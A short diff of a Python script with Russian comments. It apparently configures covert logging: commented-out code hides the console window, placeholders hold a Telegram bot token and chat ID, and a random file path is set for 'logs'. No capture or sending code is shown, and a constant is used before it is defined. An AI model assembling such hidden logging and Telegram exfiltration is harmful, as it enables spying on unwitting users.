@@ -19,17 +19,15 @@ from multiprocessing import Queue # фиксим баг при заморозк�
                                   # https://stackoverflow.com/questions/40768570/importerror-no-module-named-queue-while-running-my-app-freezed-with-cx-freeze
 
 
-
 # Можно скрыть окно консоли
 # window = win32console.GetConsoleWindow()
 # win32gui.ShowWindow(window,0) 
-
 
 TGBOT_TOKEN = 'токен вашего бота'
 TGBOT_CHAT_ID = 'chat_id вашего бота'
 
 filename = ''.join(random.choices(ASCII_UPPERCASE + ASCII_LOWERCASE, k=8))
-filepath = f'путь до файла, в котором будут лежать данные{filename}'
+filepath = f'путь до файла, в котором будут лежать логи{filename}'
 
 
 ASCII_UPPERCASE = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
